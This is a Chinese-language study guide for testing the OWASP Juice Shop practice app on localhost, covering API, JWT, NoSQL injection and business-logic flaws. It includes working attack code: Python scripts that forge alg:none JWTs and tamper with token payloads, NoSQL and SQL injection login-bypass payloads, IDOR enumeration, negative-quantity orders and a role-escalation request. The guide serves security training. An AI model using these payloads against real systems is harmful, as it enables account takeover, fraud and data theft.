# Phase 4 学习指南: Juice Shop 安全测试

## 学习目标

通过 OWASP Juice Shop 靶机学习和验证现代 Web 应用的安全漏洞，掌握：
- REST API 安全测试
- JWT 认证漏洞
- NoSQL 注入攻击
- 业务逻辑漏洞

---

## 1. 环境准备

### 启动靶机环境

```bash
# 进入项目目录
cd /Users/michaelzhou/Documents/github/michael-zhou-qa-portfolio/security-testing-demo

# 启动 Docker 环境
docker compose -f docker/docker-compose.yml up -d

# 验证服务运行
curl -I http://localhost:3000  # Juice Shop
curl -I http://localhost       # DVWA
```

### 运行测试

```bash
# 运行所有 Juice Shop 测试
python3 -m pytest tests/test_juice_shop_api.py tests/test_jwt.py tests/test_nosql_injection.py tests/test_business_logic.py -v

# 运行单个测试文件
python3 -m pytest tests/test_jwt.py -v

# 运行带详细输出
python3 -m pytest tests/test_juice_shop_api.py -v -s
```

---

## 2. API 安全测试 (test_juice_shop_api.py)

### 学习要点

| 漏洞类型 | OWASP ID | 测试方法 |
|----------|----------|----------|
| 未授权访问 | A01 | 不带 Token 访问敏感 API |
| IDOR | A01 | 修改 ID 访问他人资源 |
| 信息泄露 | A01 | 触发错误暴露内部信息 |
| HTTP 方法滥用 | A01 | 测试 TRACE/OPTIONS |
| 速率限制缺失 | A07 | 暴力破解检测 |

### 手动验证练习

#### 练习 1: 未授权访问测试

```bash
# 不带认证访问用户列表
curl http://localhost:3000/api/Users/

# 注意: 不要加 | jq，因为安全响应返回的是 HTML 而非 JSON
# 如果 jq 报 "parse error: Invalid numeric literal"，说明返回了 HTML

# 观察响应类型:
# 漏洞: 返回 JSON 用户数据（可用 | jq 解析）= 未授权访问
# 安全: 返回 HTML 401/403 错误页面 = 正确保护（jq 会报错）
```

**预期结果**: Juice Shop 的 `/api/Users/` 端点需要认证，返回 401 HTML 错误页面：
```html
<h2><em>401</em> UnauthorizedError: No Authorization header was found</h2>
```

#### 练习 2: IDOR 漏洞测试

```bash
# 1. 先注册用户获取 Token
curl -X POST http://localhost:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{"email":"test123@test.com","password":"Test123!","passwordRepeat":"Test123!","securityQuestion":{"id":1},"securityAnswer":"test"}'

# 2. 登录获取 Token
curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test123@test.com","password":"Test123!"}'

# 3. 用获取的 Token 尝试访问其他用户的购物车 (Basket ID 1)
curl http://localhost:3000/rest/basket/1 \
  -H "Authorization: Bearer <YOUR_TOKEN>"

# 漏洞: 能访问他人购物车 = IDOR 漏洞
```

#### 练习 3: 信息泄露测试

```bash
# 发送格式错误的请求触发错误
curl -X POST http://localhost:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d 'not valid json'

# 检查响应是否包含:
# - 堆栈跟踪 (stack trace)
# - 内部路径 (/app/, node_modules)
# - 数据库信息 (sequelize, sql)
```

---

## 3. JWT 认证测试 (test_jwt.py)

### 学习要点

| 漏洞类型 | 描述 | 危害等级 |
|----------|------|----------|
| 签名验证缺失 | 服务端不验证签名 | 严重 |
| none 算法攻击 | 使用 alg:none 绕过签名 | 严重 |
| 弱密钥 | 使用可猜测的密钥 | 高 |
| Token 无过期 | Token 永不过期 | 中 |

### JWT 结构理解

```
Header.Payload.Signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImlkIjoxfX0.signature
```

### 手动验证练习

#### 练习 1: 解码 JWT

```bash
# 登录获取 Token
TOKEN=$(curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test123@test.com","password":"Test123!"}' | jq -r '.authentication.token')

echo $TOKEN

# 解码 Header (base64)
echo $TOKEN | cut -d'.' -f1 | base64 -d 2>/dev/null

# 解码 Payload (base64)
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null
```

#### 练习 2: JWT 篡改测试

```python
# 保存为 jwt_test.py 运行
import base64
import json
import requests

# 你的 Token
TOKEN = "YOUR_TOKEN_HERE"

# 解码 Payload
parts = TOKEN.split(".")
payload_b64 = parts[1]
padding = 4 - len(payload_b64) % 4
payload_b64 += "=" * padding
payload = json.loads(base64.urlsafe_b64decode(payload_b64))

print("原始 Payload:", payload)

# 修改用户 ID 为 1 (admin)
if "data" in payload:
    payload["data"]["id"] = 1

# 重新编码
new_payload_b64 = base64.urlsafe_b64encode(
    json.dumps(payload).encode()
).decode().rstrip("=")

# 构造篡改后的 Token (保留原签名)
tampered_token = f"{parts[0]}.{new_payload_b64}.{parts[2]}"

# 测试篡改后的 Token
response = requests.get(
    "http://localhost:3000/rest/user/whoami",
    headers={"Authorization": f"Bearer {tampered_token}"}
)

print("响应状态:", response.status_code)
print("响应内容:", response.text[:200])
# 如果状态码是 200，说明签名验证存在问题
```

#### 练习 3: none 算法攻击

```python
# 保存为 jwt_none.py 运行
import base64
import json
import requests

# 构造 none 算法 Header
header = {"alg": "none", "typ": "JWT"}
header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")

# 构造 Payload
payload = {"data": {"id": 1, "email": "admin@juice-sh.op"}}
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")

# 无签名 Token
none_token = f"{header_b64}.{payload_b64}."

print("None Token:", none_token)

# 测试
response = requests.get(
    "http://localhost:3000/rest/user/whoami",
    headers={"Authorization": f"Bearer {none_token}"}
)

print("响应状态:", response.status_code)
# 200 = 漏洞存在, 401/500 = 安全
```

---

## 4. NoSQL 注入测试 (test_nosql_injection.py)

### 学习要点

| 注入类型 | Payload 示例 | 原理 |
|----------|--------------|------|
| $ne 操作符 | `{"password": {"$ne": ""}}` | 密码不等于空 = 任何密码 |
| $gt 操作符 | `{"email": {"$gt": ""}}` | 大于空字符串 = 匹配所有 |
| $regex | `{"email": {"$regex": ".*"}}` | 正则匹配所有 |
| $where | `{$where: "return true"}` | 执行 JavaScript |

### 手动验证练习

#### 练习 1: $ne 操作符注入

```bash
# 尝试绕过密码验证
curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@juice-sh.op", "password": {"$ne": ""}}'

# 安全响应: 401 或 400
# 漏洞响应: 200 带 token
```

#### 练习 2: $gt 操作符注入

```bash
# 使用 $gt 匹配任意用户
curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email": {"$gt": ""}, "password": {"$gt": ""}}'
```

#### 练习 3: 搜索注入

```bash
# 在搜索参数中注入
curl "http://localhost:3000/rest/products/search?q='\$ne'=test"
curl "http://localhost:3000/rest/products/search?q=' || '1'=='1"
```

### 对比: SQL vs NoSQL 注入

| SQL 注入 | NoSQL 注入 |
|----------|------------|
| `' OR '1'='1` | `{"$ne": ""}` |
| `'; DROP TABLE--` | `{"$where": "..."}` |
| `UNION SELECT` | `{"$regex": ".*"}` |

---

## 5. 业务逻辑测试 (test_business_logic.py)

### 学习要点

| 漏洞类型 | 场景 | 影响 |
|----------|------|------|
| 负数量攻击 | 购买 -10 个商品 | 获得退款 |
| 价格篡改 | 修改结算价格 | 低价购买 |
| 优惠券滥用 | 重复使用/叠加优惠券 | 超额折扣 |
| 权限提升 | 修改用户角色 | 获取管理员权限 |

### 手动验证练习

#### 练习 1: 负数量购买

```bash
# 先获取 Token 和用户信息
TOKEN="YOUR_TOKEN"

# 获取用户 basket ID
curl http://localhost:3000/rest/user/whoami \
  -H "Authorization: Bearer $TOKEN" | jq

# 添加负数量商品到购物车
curl -X POST http://localhost:3000/api/BasketItems/ \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"ProductId": 1, "BasketId": 6, "quantity": -5}'

# 检查购物车总价是否变为负数
```

#### 练习 2: 优惠券重复使用

```bash
# 多次应用同一优惠券
curl -X PUT "http://localhost:3000/rest/basket/6/coupon/WMNSDY2019" \
  -H "Authorization: Bearer $TOKEN"

# 重复执行，观察折扣是否叠加
```

#### 练习 3: 权限提升测试

```bash
# 尝试修改用户角色为 admin
curl -X PUT http://localhost:3000/api/Users/21 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin", "isAdmin": true}'

# 验证是否成功提权
curl http://localhost:3000/rest/user/whoami \
  -H "Authorization: Bearer $TOKEN" | jq
```

---

## 6. 使用 Burp Suite 进行手动测试

### 配置

1. 启动 Burp Suite: `open -a "Burp Suite Community Edition"`
2. 配置浏览器代理: `127.0.0.1:8080`
3. 安装 Burp CA 证书 (HTTPS)

### 推荐测试流程

```
1. Proxy (拦截请求)
   └── 访问 http://localhost:3000
   └── 拦截登录请求
   └── 修改参数测试注入

2. Repeater (重放请求)
   └── 发送登录请求到 Repeater
   └── 修改 JSON payload
   └── 测试各种 NoSQL 注入

3. Intruder (批量测试)
   └── 配置 payload 位置
   └── 加载 NoSQL payload 字典
   └── 批量测试
```

### Burp Suite 测试用例

| 测试 | 位置 | Payload |
|------|------|---------|
| NoSQL 注入 | POST /rest/user/login | `{"email":"admin@juice-sh.op","password":{"$ne":""}}` |
| JWT 篡改 | Authorization Header | 修改后的 Token |
| IDOR | GET /rest/basket/1 | 遍历 ID |

---

## 7. 测试结果分析

### 测试通过含义

| 状态 | 含义 | 说明 |
|------|------|------|
| PASSED | 安全检查通过 | 应用正确防御了攻击 |
| XFAIL | 预期失败 | 已知漏洞，文档记录 |
| SKIPPED | 跳过 | 前置条件不满足 |

### 当前测试结果解读

```
test_order_history_idor - XFAIL
  → Juice Shop 存在 IDOR 漏洞，可以访问他人订单历史

test_version_disclosure - XFAIL
  → 版本信息泄露，无需认证可获取应用版本

test_jwt_signature_validation - XFAIL
  → JWT 签名验证可能存在问题

test_jwt_none_algorithm - XFAIL
  → none 算法攻击可能成功
```

---

## 8. 学习检查清单

### 知识掌握

- [ ] 理解 REST API 安全常见问题
- [ ] 理解 JWT 结构和攻击方式
- [ ] 理解 NoSQL 注入原理和 Payload
- [ ] 理解业务逻辑漏洞检测方法

### 实操技能

- [ ] 能使用 curl 手动测试 API
- [ ] 能解码和分析 JWT Token
- [ ] 能构造 NoSQL 注入 Payload
- [ ] 能使用 Burp Suite 进行测试

### 报告能力

- [ ] 能描述漏洞的影响
- [ ] 能提供漏洞复现步骤
- [ ] 能给出修复建议

---

## 9. 扩展学习

### OWASP 资源

- [OWASP Top 10](https://owasp.org/Top10/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [JWT Security Best Practices](https://curity.io/resources/learn/jwt-best-practices/)

### Juice Shop 挑战

访问 http://localhost:3000/#/score-board 查看所有安全挑战

推荐挑战：
- Login Admin - SQL 注入登录管理员
- Admin Section - 访问管理员页面
- Forged Review - 伪造评论
- GDPR Data Erasure - 数据删除

### 相关工具

| 工具 | 用途 |
|------|------|
| jwt.io | 在线 JWT 解码器 |
| Burp Suite | Web 安全测试 |
| Postman | API 测试 |
| sqlmap | SQL 注入自动化 |

---

## 10. 常见问题

### Q: 测试失败怎么办？

```bash
# 检查 Juice Shop 是否运行
curl -I http://localhost:3000

# 重启服务
docker compose -f docker/docker-compose.yml restart juice-shop

# 查看日志
docker compose -f docker/docker-compose.yml logs juice-shop
```

### Q: Token 过期怎么办？

每次测试前重新登录获取新 Token。

### Q: curl | jq 报 "parse error" 怎么办？

这说明 API 返回的不是 JSON，而是 HTML 错误页面。这通常表示：
1. **安全行为**: 端点需要认证，返回 401/403 HTML 页面
2. **服务问题**: 返回 500 错误页面

```bash
# 先不加 jq 查看原始响应
curl http://localhost:3000/api/Users/

# 如果看到 HTML 401 错误，说明端点正确保护了
# 如果需要访问，先获取 Token 再请求
```

### Q: 如何找到更多漏洞？

1. 查看 Juice Shop 源码
2. 使用 ZAP 进行自动扫描
3. 参考 OWASP 测试指南
